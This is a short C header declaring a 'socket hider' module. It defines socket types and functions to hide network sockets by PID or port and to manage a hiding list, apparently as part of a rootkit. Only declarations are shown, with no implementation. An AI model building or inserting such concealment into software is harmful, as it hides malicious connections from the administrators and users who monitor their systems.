#ifndef SOCKETHIDER_H
#define SOCKETHIDER_H

enum socket_type {
    tcp4,
    tcp6,
    udp4,
    udp6
};

/* initialize socket hider module */
int sockethider_init(void);

/* cleanup socket hider module */
void sockethider_cleanup(void);

/* hide sockets opened by PID */
void hide_sockets_by_pid(unsigned short pid);

/* add socket to hiding list */
void add_to_socket_list(int port, enum socket_type type);

/* remove socket from hiding list */
void remove_from_socket_list(int port, enum socket_type type);

/* clear hiding list */
void clear_socket_list(void);

#endif
